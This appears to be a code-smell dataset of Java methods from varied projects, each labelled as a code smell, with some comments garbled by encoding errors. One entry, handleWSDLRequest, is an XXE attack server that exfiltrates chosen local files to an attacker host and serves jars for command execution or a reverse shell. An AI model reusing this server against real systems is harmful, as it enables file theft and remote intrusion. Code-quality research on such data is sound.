    mergeDialogId=0;
    currentDialogId=0;
    selectedPhotosAdapter.notifyDataSetChanged();
    pageBlocksAdapter=null;
    if (velocityTracker == null) {
      velocityTracker=VelocityTracker.obtain();
    }
    isVisible=true;
    isVisibleOrAnimating=true;
    togglePhotosListView(false,false);
    openedFullScreenVideo=false;
    createCropView();
    toggleActionBar(false,false);
    seekToProgressPending2=0;
    skipFirstBufferingProgress=false;
    playerInjected=false;
    makeFocusable();
    backgroundDrawable.setAlpha(255);
    containerView.setAlpha(1.0f);
    onPhotoShow(null,fileLocation,imageLocation,null,null,null,photos,index,null);
    initCropView();
    setCropBitmap();
    return true;
  }
  sendPhotoType=type;
  if (sendPhotoType == SELECT_TYPE_STICKER) {
    navigationBar.setBackgroundColor(0xFF000000);
  }
  return openPhoto(null,fileLocation,imageLocation,null,null,null,photos,index,provider,chatActivity,0,0,0,true,null,null);
}",1,Code Smell
"@Override public void execute(@NonNull final LauncherAppState app,@NonNull final BgDataModel dataModel,@NonNull final AllAppsList apps){
  if (mInstallInfo.state == PackageInstallInfo.STATUS_INSTALLED) {
    try {
      ApplicationInfo ai=app.getContext().getPackageManager().getApplicationInfo(mInstallInfo.packageName,0);
      if (InstantAppResolver.newInstance(app.getContext()).isInstantApp(ai)) {
        app.getModel().onPackageAdded(ai.packageName,mInstallInfo.user);
      }
    }
 catch (    PackageManager.NameNotFoundException e) {
    }
    return;
  }
synchronized (apps) {
    List<AppInfo> updatedAppInfos=apps.updatePromiseInstallInfo(mInstallInfo);
    if (!updatedAppInfos.isEmpty()) {
      for (      AppInfo appInfo : updatedAppInfos) {
        scheduleCallbackTask(c -> c.bindIncrementalDownloadProgressUpdated(appInfo));
      }
    }
    bindApplicationsIfNeeded();
  }
synchronized (dataModel) {
    final HashSet<ItemInfo> updates=new HashSet<>();
    dataModel.forAllWorkspaceItemInfos(mInstallInfo.user,si -> {
      if (si.hasPromiseIconUi() && mInstallInfo.packageName.equals(si.getTargetPackage())) {
        si.setProgressLevel(mInstallInfo);
        updates.add(si);
      }
    }
);
    for (    LauncherAppWidgetInfo widget : dataModel.appWidgets) {
      if (widget.providerName.getPackageName().equals(mInstallInfo.packageName)) {
        widget.installProgress=mInstallInfo.progress;
        updates.add(widget);
      }
    }
    if (!updates.isEmpty()) {
      scheduleCallbackTask(callbacks -> callbacks.bindRestoreItemsChange(updates));
    }
  }
}",1,Code Smell
"public Hooklite(XC_LoadPackage.LoadPackageParam lpparam){
  XposedHelpers.findAndHookMethod(XposedHelpers.findClass(""com.netease.cloudmusic.NeteaseMusicApplication"",lpparam.classLoader),""attachBaseContext"",Context.class,new XC_MethodHook(){
    @Override protected void afterHookedMethod(    MethodHookParam param) throws Throwable {
      final Context context=(Context)param.thisObject;
      int versionCode=140;
      ExtraHelper.init(context);
      SettingHelper.init(context);
      final String processName=Tools.getCurrentProcessName(context);
      if (processName.equals(PACKAGE_NAME)) {
        new SettingHook(context,versionCode);
        if (!SettingHelper.getInstance().getSetting(SettingHelper.master_key))         return;
        new ProxyHook(context,false);
        if (SettingHelper.getInstance().isEnable(SettingHelper.black_key)) {
          new BlackHook(context,versionCode);
          deleteAdAndTinker();
        }
        new GrayHook(context);
        new AutoSignInHook(context,versionCode);
        new AdAndUpdateHook(context,versionCode);
        new MagiskFixHook(context);
        new InternalDialogHook(context,versionCode);
        ClassHelper.getCacheClassList(context,versionCode,() -> {
          new UserProfileHook(context);
          new EAPIHook(context);
          new DownloadMD5Hook(context);
          new HideTabHook(context,versionCode);
          new HideSidebarHook(context,versionCode);
          new HideBannerHook(context,versionCode);
          new HideBubbleHook(context);
          new CommentHotClickHook(context);
          new PlayerActivityHook(context,versionCode);
          new CdnHook(context,versionCode);
          mainProcessInit=true;
          if (mainProcessInit && playProcessInit)           context.sendBroadcast(new Intent(msg_hook_play_process));
        }
);
        IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction(msg_play_process_init_finish);
        intentFilter.addAction(msg_send_notification);
        context.registerReceiver(new BroadcastReceiver(){
          @Override public void onReceive(          Context c,          Intent intent){
            if (msg_play_process_init_finish.equals(intent.getAction())) {
              playProcessInit=true;
              if (mainProcessInit && playProcessInit)               context.sendBroadcast(new Intent(msg_hook_play_process));
            }
 else             if (msg_send_notification.equals(intent.getAction())) {
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)               NotificationHelper.getInstance(context).sendUnLockNotification(context,intent.getIntExtra(""code"",0x10),intent.getStringExtra(""title""),intent.getStringExtra(""title""),intent.getStringExtra(""message""));
              XposedBridge.log(intent.getStringExtra(""title"") + ""锛�"" + intent.getStringExtra(""message""));
            }
          }
        }
,intentFilter);
      }
 else       if (processName.equals(PACKAGE_NAME + "":play"") && SettingHelper.getInstance().getSetting(SettingHelper.master_key)) {
        new ProxyHook(context,true);
        IntentFilter intentFilter=new IntentFilter();
        intentFilter.addAction(msg_hook_play_process);
        context.registerReceiver(new BroadcastReceiver(){
          @Override public void onReceive(          Context c,          Intent intent){
            if (msg_hook_play_process.equals(intent.getAction())) {
              ClassHelper.getCacheClassList(context,versionCode,() -> {
                new EAPIHook(context);
                new CdnHook(context,versionCode);
              }
);
            }
          }
        }
,intentFilter);
        context.sendBroadcast(new Intent(msg_play_process_init_finish));
      }
    }
  }
);
}",1,Code Smell
"@Override public J visitBlock(J.Block block,Integer p){
switch (loc) {
case BLOCK_END:
{
      if (block.isScope(insertionPoint)) {
        List<Statement> gen=substitutions.unsubstitute(templateParser.parseBlockStatements(new Cursor(getCursor(),insertionPoint),Statement.class,substitutedTemplate,loc,mode));
        if (coordinates.getComparator() != null) {
          J.Block b=block;
          for (          Statement g : gen) {
            b=b.withStatements(ListUtils.insertInOrder(block.getStatements(),autoFormat(g,p,getCursor()),getComparatorOrThrow()));
          }
          return b;
        }
        return block.withStatements(ListUtils.concatAll(block.getStatements(),ListUtils.map(gen,(i,s) -> autoFormat(s,p,getCursor()))));
      }
      break;
    }
case STATEMENT_PREFIX:
{
    return block.withStatements(ListUtils.flatMap(block.getStatements(),statement -> {
      if (statement.isScope(insertionPoint)) {
        List<Statement> gen=substitutions.unsubstitute(templateParser.parseBlockStatements(new Cursor(getCursor(),insertionPoint),Statement.class,substitutedTemplate,loc,mode));
        Cursor parent=getCursor();
        for (int i=0; i < gen.size(); i++) {
          Statement s=gen.get(i);
          Statement formattedS=autoFormat(i == 0 ? s.withPrefix(statement.getPrefix().withComments(emptyList())) : s,p,parent);
          gen.set(i,formattedS);
        }
switch (mode) {
case REPLACEMENT:
          return gen;
case BEFORE:
        return ListUtils.concat(gen,statement);
case AFTER:
      return ListUtils.concat(statement,gen);
  }
}
return statement;
}
));
}
}
return super.visitBlock(block,p);
}",1,Code Smell
"/** 
 * Put an entry on the output stream. This writes the entry's header record and positions the output stream for writing the contents of the entry. Once this method is called, the stream is ready for calls to write() to write the entry's contents. Once the contents are written, closeArchiveEntry() <B>MUST</B> be called to ensure that all buffered data is completely written to the output stream.
 * @param archiveEntry The TarEntry to be written to the archive.
 * @throws IOException on error
 * @throws ClassCastException if archiveEntry is not an instance of TarArchiveEntry
 * @throws IllegalArgumentException if the {@link TarArchiveOutputStream#longFileMode} equals{@link TarArchiveOutputStream#LONGFILE_ERROR} and the filename is too long
 * @throws IllegalArgumentException if the {@link TarArchiveOutputStream#bigNumberMode} equals{@link TarArchiveOutputStream#BIGNUMBER_ERROR} and one of the numeric valuesexceeds the limits of a traditional tar header.
 */
@Override public void putArchiveEntry(final ArchiveEntry archiveEntry) throws IOException {
  if (finished) {
    throw new IOException(""Stream has already been finished"");
  }
  final TarArchiveEntry entry=(TarArchiveEntry)archiveEntry;
  if (entry.isGlobalPaxHeader()) {
    final byte[] data=encodeExtendedPaxHeadersContents(entry.getExtraPaxHeaders());
    entry.setSize(data.length);
    entry.writeEntryHeader(recordBuf,zipEncoding,bigNumberMode == BIGNUMBER_STAR);
    writeRecord(recordBuf);
    currSize=entry.getSize();
    currBytes=0;
    this.haveUnclosedEntry=true;
    write(data);
    closeArchiveEntry();
  }
 else {
    final Map<String,String> paxHeaders=new HashMap<>();
    final String entryName=entry.getName();
    final boolean paxHeaderContainsPath=handleLongName(entry,entryName,paxHeaders,""path"",TarConstants.LF_GNUTYPE_LONGNAME,""file name"");
    final String linkName=entry.getLinkName();
    final boolean paxHeaderContainsLinkPath=linkName != null && !linkName.isEmpty() && handleLongName(entry,linkName,paxHeaders,""linkpath"",TarConstants.LF_GNUTYPE_LONGLINK,""link name"");
    if (bigNumberMode == BIGNUMBER_POSIX) {
      addPaxHeadersForBigNumbers(paxHeaders,entry);
    }
 else     if (bigNumberMode != BIGNUMBER_STAR) {
      failForBigNumbers(entry);
    }
    if (addPaxHeadersForNonAsciiNames && !paxHeaderContainsPath && !ASCII.canEncode(entryName)) {
      paxHeaders.put(""path"",entryName);
    }
    if (addPaxHeadersForNonAsciiNames && !paxHeaderContainsLinkPath && (entry.isLink() || entry.isSymbolicLink())&& !ASCII.canEncode(linkName)) {
      paxHeaders.put(""linkpath"",linkName);
    }
    paxHeaders.putAll(entry.getExtraPaxHeaders());
    if (!paxHeaders.isEmpty()) {
      writePaxHeaders(entry,entryName,paxHeaders);
    }
    entry.writeEntryHeader(recordBuf,zipEncoding,bigNumberMode == BIGNUMBER_STAR);
    writeRecord(recordBuf);
    currBytes=0;
    if (entry.isDirectory()) {
      currSize=0;
    }
 else {
      currSize=entry.getSize();
    }
    currName=entryName;
    haveUnclosedEntry=true;
  }
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public void finalizeExplosion(boolean spawnParticles){
  if (this.level.isClientSide) {
    this.level.playLocalSound(this.x,this.y,this.z,this.explosionSound,SoundSource.BLOCKS,4.0F,(1.0F + (this.level.random.nextFloat() - this.level.random.nextFloat()) * 0.2F) * 0.7F,false);
  }
  boolean flag=this.interactsWithBlocks();
  if (spawnParticles) {
    ParticleOptions particleType;
    if (this.radius >= 2.0F && flag) {
      particleType=ParticleTypes.EXPLOSION_EMITTER;
    }
 else {
      particleType=ParticleTypes.EXPLOSION;
    }
    this.level.addParticle(particleType,this.x,this.y,this.z,1.0D,0.0D,0.0D);
  }
  if (flag) {
    this.level.getProfiler().push(""explosion_blocks"");
    List<Pair<ItemStack,BlockPos>> list=new ArrayList<>();
    Util.shuffle(this.toBlow,this.level.random);
    if (this.callBlockExplodeEvent()) {
      this.wasCanceled=true;
      return;
    }
    for (    BlockPos blockpos : this.toBlow) {
      BlockState blockstate=this.level.getBlockState(blockpos);
      Block block=blockstate.getBlock();
      if (block instanceof TntBlock) {
        var sourceEntity=source == null ? null : source;
        var sourceBlock=sourceEntity == null ? BlockPos.containing(this.x,this.y,this.z) : null;
        if (!CraftEventFactory.callTNTPrimeEvent(this.level,blockpos,TNTPrimeEvent.PrimeCause.EXPLOSION,sourceEntity,sourceBlock)) {
          this.level.sendBlockUpdated(blockpos,Blocks.AIR.defaultBlockState(),blockstate,3);
          continue;
        }
      }
      this.level.getBlockState(blockpos).onExplosionHit(this.level,blockpos,(Explosion)(Object)this,(itemstack,pos) -> {
        addOrAppendStack(list,itemstack,pos);
      }
);
    }
    for (    Pair<ItemStack,BlockPos> pair : list) {
      Block.popResource(this.level,pair.getSecond(),pair.getFirst());
    }
  }
  if (this.fire) {
    for (    BlockPos blockpos2 : this.toBlow) {
      if (this.random.nextInt(3) == 0 && this.level.getBlockState(blockpos2).isAir() && this.level.getBlockState(blockpos2.below()).isSolidRender(this.level,blockpos2.below())) {
        BlockIgniteEvent event=CraftEventFactory.callBlockIgniteEvent(this.level,blockpos2,(Explosion)(Object)this);
        if (!event.isCancelled()) {
          this.level.setBlockAndUpdate(blockpos2,BaseFireBlock.getState(this.level,blockpos2));
        }
      }
    }
  }
}",1,Code Smell
"private static void handleWSDLRequest(HttpExchange exchange) throws Exception {
  String query=exchange.getRequestURI().getQuery();
  Map<String,String> params=parseQuery(query);
  String path=exchange.getRequestURI().getPath().substring(1);
  if (path.startsWith(""list"")) {
    String file=params.get(""file"");
    if (file != null && !file.isEmpty()) {
      String listWsdl="""" + ""<!DOCTYPE x [\n"" + ""  <!ENTITY % aaa SYSTEM \""file:///"" + file + ""\"">\n""+ ""  <!ENTITY % bbb SYSTEM \""http://""+ Config.ip+ "":""+ Config.httpPort+ ""/http.wsdl\"">\n""+ ""  %bbb;\n""+ ""]>\n""+ ""<definitions name=\""HelloService\"" xmlns=\""http://schemas.xmlsoap.org/wsdl/\"">\n""+ ""  &ddd;\n""+ ""</definitions>"";
      System.out.println(ansi().render(""@|green [+] Response Code: |@"" + 200));
      exchange.sendResponseHeaders(200,listWsdl.getBytes().length);
      exchange.getResponseBody().write(listWsdl.getBytes());
    }
 else {
      System.out.println(ansi().render(""@|red [!] Missing or wrong argument|@""));
      System.out.println(ansi().render(""@|red [!] Response Code: |@"" + 404));
      exchange.sendResponseHeaders(404,0);
    }
    exchange.close();
  }
 else   if (path.startsWith(""upload"")) {
    String type=params.get(""type"");
    String[] args=null;
    if (type.equalsIgnoreCase(""command"")) {
      args=new String[]{params.get(""cmd"")};
    }
 else     if (type.equalsIgnoreCase(""dnslog"")) {
      args=new String[]{params.get(""url"")};
    }
 else     if (type.equalsIgnoreCase(""reverseshell"")) {
      args=new String[]{params.get(""ip""),params.get(""port"")};
    }
    String jarName=createJar(type,args);
    if (jarName != null) {
      String uploadWsdl=""<!DOCTYPE a SYSTEM \""jar:http://"" + Config.ip + "":""+ Config.httpPort+ ""/""+ jarName+ "".jar!/file.txt\""><a></a>"";
      System.out.println(ansi().render(""@|green [+] Response Code: |@"" + 200));
      exchange.sendResponseHeaders(200,uploadWsdl.getBytes().length);
      exchange.getResponseBody().write(uploadWsdl.getBytes());
    }
 else {
      System.out.println(ansi().render(""@|red [!] Missing or wrong argument|@""));
      System.out.println(ansi().render(""@|red [!] Response Code: |@"" + 404));
      exchange.sendResponseHeaders(404,0);
    }
    exchange.close();
  }
 else   if (path.startsWith(""http"")) {
    String xxhttp=""<!ENTITY % ccc '<!ENTITY ddd &#39;<import namespace=\""uri\"" location=\""http://"" + Config.ip + "":""+ Config.httpPort+ ""/xxelog?%aaa;\""/>&#39;>'>%ccc;"";
    System.out.println(ansi().render(""@|green [+] Response Code: |@"" + 200));
    exchange.sendResponseHeaders(200,xxhttp.getBytes().length);
    exchange.getResponseBody().write(xxhttp.getBytes());
    exchange.close();
  }
 else {
    System.out.println(ansi().render(""@|red [!] Response Code: |@"" + 404));
    exchange.sendResponseHeaders(404,0);
    exchange.close();
  }
}",1,Code Smell
"/** 
 * 璁剧疆婊氬姩鑷姩鍔犺浇锛岄渶瑕佺瓑tableview鍔犺浇瀹屽悗璁剧疆
 * @param view tableview
 */
private void addScrollBarListener(TableView<?> view){
  ScrollBar bar=(ScrollBar)view.lookup("".scroll-bar:vertical"");
  bar.valueProperty().addListener((observable,oldValue,newValue) -> {
    if ((double)newValue == 1.0D) {
      Tab tab=tabPane.getCurrentTab();
      TabDataBean bean=tabPane.getTabDataBean(tab);
      if (bean.hasMoreData) {
        bean.page+=1;
        String text=DataUtil.replaceString(tab.getText());
        Task<Void> task=new Task<Void>(){
          @Override protected Void call(){
            HashMap<String,String> result=helper.getHTML(client.getParam(String.valueOf(bean.page),isAll.isSelected()) + helper.encode(text),120000,120000);
            TableView<TableBean> tableView=(TableView<TableBean>)((BorderPane)tab.getContent()).getCenter();
            if (result.get(""code"").equals(""200"")) {
              JSONObject obj=JSON.parseObject(result.get(""msg""));
              if (obj.getBoolean(""error"")) {
                return null;
              }
              List<TableBean> list=(List<TableBean>)DataUtil.loadJsonData(bean,obj,null,null,false);
              if (list.size() != 0) {
                List<TableBean> tmp=list.stream().sorted(Comparator.comparing(TableBean::getIntNum)).collect(Collectors.toList());
                Platform.runLater(() -> tableView.getItems().addAll(FXCollections.observableArrayList(tmp)));
                Platform.runLater(() -> tableView.scrollTo(tableView.getItems().size() - Integer.parseInt(client.getSize())));
                StatusBar statusBar=tabPane.getBar(tab);
                Label countLabel=(Label)statusBar.getRightItems().get(1);
                Platform.runLater(() -> countLabel.setText(String.valueOf(Integer.parseInt(countLabel.getText()) + obj.getJSONArray(""results"").size())));
                if (client.getCheckStatus()) {
                  result=helper.getLeftAmount(String.format(client.personalInfoAPI,client.getEmail(),client.getKey()),120000,120000);
                  if (result.get(""code"").equals(""200"")) {
                    Label infoLabel=(Label)statusBar.getLeftItems().get(0);
                    String msg=result.get(""msg"");
                    Platform.runLater(() -> {
                      statusBar.setText("""");
                      infoLabel.setText(msg);
                    }
);
                  }
                }
              }
              if (bean.page * Integer.parseInt(client.getSize()) > obj.getInteger(""size"")) {
                bean.hasMoreData=false;
              }
            }
            return null;
          }
        }
;
        new Thread(task).start();
      }
    }
  }
);
}",1,Code Smell
"@Override public boolean onTouchEvent(MotionEvent event){
  if (chartData == null) {
    return false;
  }
  if (!enabled) {
    pickerDelegate.uncapture(event,event.getActionIndex());
    getParent().requestDisallowInterceptTouchEvent(false);
    chartCaptured=false;
    return false;
  }
  int x=(int)event.getX(event.getActionIndex());
  int y=(int)event.getY(event.getActionIndex());
switch (event.getActionMasked()) {
case MotionEvent.ACTION_DOWN:
    capturedTime=System.currentTimeMillis();
  getParent().requestDisallowInterceptTouchEvent(true);
boolean captured=pickerDelegate.capture(x,y,event.getActionIndex());
if (captured) {
return true;
}
capturedX=lastX=x;
capturedY=lastY=y;
if (chartArea.contains(x,y)) {
if (selectedIndex < 0 || !animateLegentTo) {
chartCaptured=true;
selectXOnChart(x,y);
}
return true;
}
return false;
case MotionEvent.ACTION_POINTER_DOWN:
return pickerDelegate.capture(x,y,event.getActionIndex());
case MotionEvent.ACTION_MOVE:
int dx=x - lastX;
int dy=y - lastY;
if (pickerDelegate.captured()) {
boolean rez=pickerDelegate.move(x,y,event.getActionIndex());
if (event.getPointerCount() > 1) {
x=(int)event.getX(1);
y=(int)event.getY(1);
pickerDelegate.move(x,y,1);
}
getParent().requestDisallowInterceptTouchEvent(rez);
return true;
}
if (chartCaptured) {
boolean disable;
if (canCaptureChartSelection && System.currentTimeMillis() - capturedTime > 200) {
disable=true;
}
 else {
disable=Math.abs(dx) > Math.abs(dy) || Math.abs(dy) < touchSlop;
}
lastX=x;
lastY=y;
getParent().requestDisallowInterceptTouchEvent(disable);
selectXOnChart(x,y);
}
 else if (chartArea.contains(capturedX,capturedY)) {
int dxCaptured=capturedX - x;
int dyCaptured=capturedY - y;
if (Math.sqrt(dxCaptured * dxCaptured + dyCaptured * dyCaptured) > touchSlop || System.currentTimeMillis() - capturedTime > 200) {
chartCaptured=true;
selectXOnChart(x,y);
}
}
return true;
case MotionEvent.ACTION_POINTER_UP:
pickerDelegate.uncapture(event,event.getActionIndex());
return true;
case MotionEvent.ACTION_CANCEL:
case MotionEvent.ACTION_UP:
if (pickerDelegate.uncapture(event,event.getActionIndex())) {
return true;
}
if (chartArea.contains(capturedX,capturedY) && !chartCaptured) {
animateLegend(false);
}
pickerDelegate.uncapture();
updateLineSignature();
getParent().requestDisallowInterceptTouchEvent(false);
chartCaptured=false;
onActionUp();
invalidate();
int min=0;
if (useMinHeight) min=findMinValue(startXIndex,endXIndex);
setMaxMinValue(findMaxValue(startXIndex,endXIndex),min,true,true,false);
return true;
}
return false;
}",1,Code Smell
"private int getMaxNameWidth(){
  if (documentAttachType == DOCUMENT_ATTACH_TYPE_STICKER || documentAttachType == DOCUMENT_ATTACH_TYPE_WALLPAPER || currentMessageObject.type == MessageObject.TYPE_ROUND_VIDEO) {
    int maxWidth;
    if (AndroidUtilities.isTablet()) {
      if (isChat && !isThreadPost && !currentMessageObject.isOutOwner()&& currentMessageObject.needDrawAvatar()) {
        maxWidth=AndroidUtilities.getMinTabletSide() - AndroidUtilities.dp(42);
      }
 else {
        maxWidth=AndroidUtilities.getMinTabletSide();
      }
    }
 else {
      if (isChat && !isThreadPost && !currentMessageObject.isOutOwner()&& currentMessageObject.needDrawAvatar()) {
        maxWidth=Math.min(getParentWidth(),AndroidUtilities.displaySize.y) - AndroidUtilities.dp(42);
      }
 else {
        maxWidth=Math.min(getParentWidth(),AndroidUtilities.displaySize.y);
      }
    }
    if (isPlayingRound && (currentMessageObject == null || !currentMessageObject.isVoiceTranscriptionOpen())) {
      int backgroundWidthLocal=backgroundWidth - (AndroidUtilities.roundPlayingMessageSize - AndroidUtilities.roundMessageSize);
      return maxWidth - backgroundWidthLocal - AndroidUtilities.dp(57);
    }
    return maxWidth - backgroundWidth - AndroidUtilities.dp(57);
  }
  if (currentMessagesGroup != null && !currentMessagesGroup.isDocuments) {
    int dWidth;
    if (AndroidUtilities.isTablet()) {
      dWidth=AndroidUtilities.getMinTabletSide();
    }
 else {
      dWidth=getParentWidth();
    }
    int firstLineWidth=0;
    for (int a=0; a < currentMessagesGroup.posArray.size(); a++) {
      MessageObject.GroupedMessagePosition position=currentMessagesGroup.posArray.get(a);
      if (position.minY == 0) {
        firstLineWidth+=Math.ceil((position.pw + position.leftSpanOffset) / 1000.0f * dWidth);
      }
 else {
        break;
      }
    }
    return firstLineWidth - AndroidUtilities.dp(31 + (isAvatarVisible ? 48 : 0));
  }
 else   if (currentMessageObject.type == MessageObject.TYPE_EMOJIS) {
    return Math.max(currentMessageObject.textWidth,(int)((AndroidUtilities.displaySize.x - AndroidUtilities.dp(52) - (isAvatarVisible ? AndroidUtilities.dp(48) : 0)) * .5f));
  }
 else {
    return backgroundWidth - AndroidUtilities.dp(mediaBackground ? 22 : 31);
  }
}",1,Code Smell
"public static String replaceTrans(String text,JSONObject globalParams){
  if (text.contains(""{{random}}"")) {
    String random=(int)(Math.random() * 10 + Math.random() * 10 * 2) + 5 + """";
    text=text.replace(""{{random}}"",random);
  }
  if (text.contains(""{{timestamp}}"")) {
    String timeMillis=Calendar.getInstance().getTimeInMillis() + """";
    text=text.replace(""{{timestamp}}"",timeMillis);
  }
  if (text.contains(""{{"") && text.contains(""}}"")) {
    String tail=text.substring(text.indexOf(""{{"") + 2);
    if (tail.contains(""}}"")) {
      String child=tail.substring(tail.indexOf(""}}"") + 2);
      String middle=tail.substring(0,tail.indexOf(""}}""));
      text=text.substring(0,text.indexOf(""}}"") + 2);
      if (globalParams.getString(middle) != null) {
        text=text.replace(""{{"" + middle + ""}}"",globalParams.getString(middle));
      }
 else {
        if (middle.matches(""random\\[\\d\\]"")) {
          int t=Integer.parseInt(middle.replace(""random["","""").replace(""]"",""""));
          int digit=(int)Math.pow(10,t - 1);
          int rs=new Random().nextInt(digit * 10);
          if (rs < digit) {
            rs+=digit;
          }
          text=text.replace(""{{"" + middle + ""}}"",rs + """");
        }
        if (middle.matches(""random\\[\\d-\\d\\]"")) {
          String t=middle.replace(""random["","""").replace(""]"","""");
          int[] size=Arrays.stream(t.split(""-"")).mapToInt(Integer::parseInt).toArray();
          text=text.replace(""{{"" + middle + ""}}"",(int)(Math.random() * (size[1] - size[0] + 1)) + size[0] + """");
        }
        if (middle.matches(""random\\[.+\\|.+\\]"")) {
          String t=middle.replace(""random["","""").replace(""]"","""");
          String[] size=t.split(""\\|"");
          text=text.replace(""{{"" + middle + ""}}"",size[new Random().nextInt(size.length)]);
        }
      }
      text=text + replaceTrans(child,globalParams);
    }
  }
  return text;
}",1,Code Smell
"/** 
 * Reads an arbitrary object the input stream.
 */
public Object readObject(Class expectedClass) throws IOException {
  if (!parseTag())   throw new BurlapProtocolException(""expected <tag>"");
  String tag=sbuf.toString();
  if (tag.equals(""null"")) {
    expectEndTag(""null"");
    return null;
  }
 else   if (tag.equals(""boolean"")) {
    int value=parseInt();
    expectEndTag(""boolean"");
    return new Boolean(value != 0);
  }
 else   if (tag.equals(""int"")) {
    int value=parseInt();
    expectEndTag(""int"");
    return new Integer(value);
  }
 else   if (tag.equals(""long"")) {
    long value=parseLong();
    expectEndTag(""long"");
    return new Long(value);
  }
 else   if (tag.equals(""string"")) {
    sbuf.setLength(0);
    parseString(sbuf);
    String value=sbuf.toString();
    expectEndTag(""string"");
    return value;
  }
 else   if (tag.equals(""xml"")) {
    sbuf.setLength(0);
    parseString(sbuf);
    String value=sbuf.toString();
    expectEndTag(""xml"");
    return value;
  }
 else   if (tag.equals(""date"")) {
    if (utcCalendar == null)     utcCalendar=Calendar.getInstance(TimeZone.getTimeZone(""UTC""));
    long value=parseDate(utcCalendar);
    expectEndTag(""date"");
    return new Date(value);
  }
 else   if (tag.equals(""map"")) {
    String type=readType();
    return readMap(expectedClass,type);
  }
 else   if (tag.equals(""list"")) {
    String type=readType();
    int length=readLength();
    return readList(expectedClass,type,length);
  }
 else   if (tag.equals(""ref"")) {
    int value=parseInt();
    expectEndTag(""ref"");
    return refs.elementAt(value);
  }
 else   if (tag.equals(""remote"")) {
    String type=readType();
    String url=readString();
    expectEndTag(""remote"");
    return resolveRemote(type,url);
  }
 else   return readExtensionObject(expectedClass,tag);
}",1,Code Smell
"@Override public Map<String,Map<Integer,String>> getTopicBrokerInfo(Set<String> topicNameSet){
  ConcurrentHashSet<String> keySet;
  Map<Integer,String> brokerInfoMap;
  Map<String,Map<Integer,String>> retEntityMap=new HashMap<>();
  if (topicNameSet == null || topicNameSet.isEmpty()) {
    for (    TopicDeployEntity entry : topicDeployCache.values()) {
      if (entry == null) {
        continue;
      }
      brokerInfoMap=retEntityMap.computeIfAbsent(entry.getTopicName(),k -> new HashMap<>());
      brokerInfoMap.put(entry.getBrokerId(),entry.getBrokerIp());
    }
  }
 else {
    for (    String topicName : topicNameSet) {
      if (topicName == null) {
        continue;
      }
      brokerInfoMap=retEntityMap.computeIfAbsent(topicName,k -> new HashMap<>());
      keySet=topicName2RecordCache.get(topicName);
      if (keySet != null) {
        for (        String key : keySet) {
          TopicDeployEntity entry=topicDeployCache.get(key);
          if (entry != null) {
            brokerInfoMap.put(entry.getBrokerId(),entry.getBrokerIp());
          }
        }
      }
    }
  }
  return retEntityMap;
}",1,Code Smell
"@Override public void editCallback(String label,String packageName,String edit){
  boolean appExists=false;
  String mLastEdit=null;
  String isOriginal=null;
  for (int i=0; i < appLists.size(); i++) {
    AppArrayList arrayList=appLists.get(i);
    if (arrayList.mPackageName.equals(packageName)) {
      if (arrayList.mEdit != null) {
        mLastEdit=arrayList.mEdit;
      }
      if (edit.equals(label)) {
        isOriginal=packageName;
        arrayList.mEdit=null;
      }
 else {
        arrayList.mEdit=edit;
      }
      arrayList.mAppName.setText(edit);
      appExists=true;
      break;
    }
  }
  if (appExists) {
    if (mLastEdit != null) {
      deleteEdit(packageName,mLastEdit);
    }
    if (isOriginal != null) {
      deleteEdit(packageName,isOriginal);
      return;
    }
    String randomString=generateRandomString(5);
    selectedApps.add(packageName + ""喔�"" + edit+ ""喔�""+ randomString);
    putShared();
  }
}",1,Code Smell
"private void stopRecordingInternal(final int send,boolean notify,int scheduleDate){
  if (send != 0) {
    final TLRPC.TL_document audioToSend=recordingAudio;
    final File recordingAudioFileToSend=recordingAudioFile;
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""stop recording internal filename "" + recordingAudioFile.getPath());
    }
    fileEncodingQueue.postRunnable(() -> {
      stopRecord();
      if (BuildVars.LOGS_ENABLED) {
        FileLog.d(""stop recording internal in queue "" + recordingAudioFileToSend.exists() + "" ""+ recordingAudioFileToSend.length());
      }
      AndroidUtilities.runOnUIThread(() -> {
        if (BuildVars.LOGS_ENABLED) {
          FileLog.d(""stop recording internal "" + recordingAudioFileToSend.exists() + "" ""+ recordingAudioFileToSend.length()+ "" ""+ "" recordTimeCount ""+ recordTimeCount+ "" writedFrames""+ writedFrame);
        }
        boolean fileExist=recordingAudioFileToSend.exists();
        if (!fileExist && BuildVars.DEBUG_VERSION) {
          FileLog.e(new RuntimeException(""file not found :( recordTimeCount "" + recordTimeCount + "" writedFrames""+ writedFrame));
        }
        audioToSend.date=ConnectionsManager.getInstance(recordingCurrentAccount).getCurrentTime();
        audioToSend.size=(int)recordingAudioFileToSend.length();
        TLRPC.TL_documentAttributeAudio attributeAudio=new TLRPC.TL_documentAttributeAudio();
        attributeAudio.voice=true;
        attributeAudio.waveform=getWaveform2(recordSamples,recordSamples.length);
        if (attributeAudio.waveform != null) {
          attributeAudio.flags|=4;
        }
        long duration=recordTimeCount;
        attributeAudio.duration=(int)(recordTimeCount / 1000);
        audioToSend.attributes.add(attributeAudio);
        if (duration > 700) {
          NotificationCenter.getInstance(recordingCurrentAccount).postNotificationName(NotificationCenter.beforeAudioDidSent,recordingGuid,send == 2 ? audioToSend : null,send == 2 ? recordingAudioFileToSend.getAbsolutePath() : null);
          if (send == 1) {
            SendMessagesHelper.getInstance(recordingCurrentAccount).sendMessage(audioToSend,null,recordingAudioFileToSend.getAbsolutePath(),recordDialogId,recordReplyingMsg,recordReplyingTopMsg,null,null,null,null,notify,scheduleDate,0,null,null,false);
          }
          NotificationCenter.getInstance(recordingCurrentAccount).postNotificationName(NotificationCenter.audioDidSent,recordingGuid,send == 2 ? audioToSend : null,send == 2 ? recordingAudioFileToSend.getAbsolutePath() : null);
        }
 else {
          NotificationCenter.getInstance(recordingCurrentAccount).postNotificationName(NotificationCenter.audioRecordTooShort,recordingGuid,false,(int)duration);
          AutoDeleteMediaTask.unlockFile(recordingAudioFileToSend);
          recordingAudioFileToSend.delete();
        }
        requestAudioFocus(false);
      }
);
    }
);
  }
 else {
    AutoDeleteMediaTask.unlockFile(recordingAudioFile);
    if (recordingAudioFile != null) {
      recordingAudioFile.delete();
    }
    requestAudioFocus(false);
  }
  try {
    if (audioRecorder != null) {
      audioRecorder.release();
      audioRecorder=null;
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  recordingAudio=null;
  recordingAudioFile=null;
  manualRecording=false;
}",1,Code Smell
